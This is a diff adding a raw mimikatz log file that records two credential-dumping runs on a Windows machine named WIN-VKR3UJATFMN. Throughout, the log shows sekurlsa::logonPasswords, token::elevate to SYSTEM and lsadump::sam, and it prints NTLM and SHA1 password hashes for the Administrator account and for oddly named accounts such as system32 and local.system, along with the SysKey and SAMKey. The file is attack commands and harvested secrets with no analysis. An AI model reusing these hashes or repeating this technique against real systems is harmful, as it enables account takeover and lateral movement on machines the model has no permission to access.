@@ -1,0 +1,255 @@
+Using '.\!logs\Result.txt' for logfile : OK
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 48232 (00000000:0000bc68)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:13:53
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 967833 (00000000:000ec499)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:18:00
+SID               : S-1-5-90-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-VKR3UJATFMN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 967809 (00000000:000ec481)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:18:00
+SID               : S-1-5-90-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-VKR3UJATFMN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 989474 (00000000:000f1922)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : WIN-VKR3UJATFMN
+Logon Server      : WIN-VKR3UJATFMN
+Logon Time        : 2019/10/14 21:18:04
+SID               : S-1-5-21-3373095786-5884286-2809166339-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 3b1da22b1973c0bb86d4a9b6a9ae65f6
+	 * SHA1     : 96234be5bf1f317e217af014a93fc67a51bd6b3b
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WIN-VKR3UJATFMN
+	 * NTLM     : 3b1da22b1973c0bb86d4a9b6a9ae65f6
+	 * SHA1     : 96234be5bf1f317e217af014a93fc67a51bd6b3b
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WIN-VKR3UJATFMN
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WIN-VKR3UJATFMN
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN-VKR3UJATFMN$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:13:56
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-VKR3UJATFMN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-vkr3ujatfmn$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:13:59
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 72157 (00000000:000119dd)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:13:57
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-VKR3UJATFMN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 72175 (00000000:000119ef)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:13:57
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-VKR3UJATFMN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN-VKR3UJATFMN$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2019/10/14 21:13:52
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-VKR3UJATFMN$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-vkr3ujatfmn$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+560	{0;000003e7} 0 D 43036     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,20p)	Primary
+ -> Impersonated !
+ * Process Token : {0;000f1922} 2 D 16012554  	WIN-VKR3UJATFMN\Administrator	S-1-5-21-3373095786-5884286-2809166339-500	(14g,24p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 16182014  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,20p)	Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : WIN-VKR3UJATFMN
+SysKey : 5cfe8ece27b290a502126ed1e6bc9211
+Local SID : S-1-5-21-3373095786-5884286-2809166339
+
+SAMKey : a4f73cfd1819408d675c38d26f13cd92
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 3b1da22b1973c0bb86d4a9b6a9ae65f6
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003eb (1003)
+User : Support
+  Hash NTLM: 86c3820103d389929d22635861ca262e
+
+RID  : 000003ec (1004)
+User : system32
+  Hash NTLM: 3b54d244098e4787554b1caa9405bb4c
+
+RID  : 000003ed (1005)
+User : local.system
+  Hash NTLM: 3b54d244098e4787554b1caa9405bb4c
+
+mimikatz(commandline) # exit
+Bye!
+Using '.\!logs\Result.txt' for logfile : OK
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+560	{0;000003e7} 0 D 43036     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,20p)	Primary
+ -> Impersonated !
+ * Process Token : {0;000f1922} 2 D 16187586  	WIN-VKR3UJATFMN\Administrator	S-1-5-21-3373095786-5884286-2809166339-500	(14g,24p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 16218019  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,20p)	Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : WIN-VKR3UJATFMN
+SysKey : 5cfe8ece27b290a502126ed1e6bc9211
+Local SID : S-1-5-21-3373095786-5884286-2809166339
+
+SAMKey : a4f73cfd1819408d675c38d26f13cd92
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 3b1da22b1973c0bb86d4a9b6a9ae65f6
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003eb (1003)
+User : Support
+  Hash NTLM: 86c3820103d389929d22635861ca262e
+
+RID  : 000003ec (1004)
+User : system32
+  Hash NTLM: 3b54d244098e4787554b1caa9405bb4c
+
+RID  : 000003ed (1005)
+User : local.system
+  Hash NTLM: 3b54d244098e4787554b1caa9405bb4c
+
+mimikatz(commandline) # exit
+Bye!
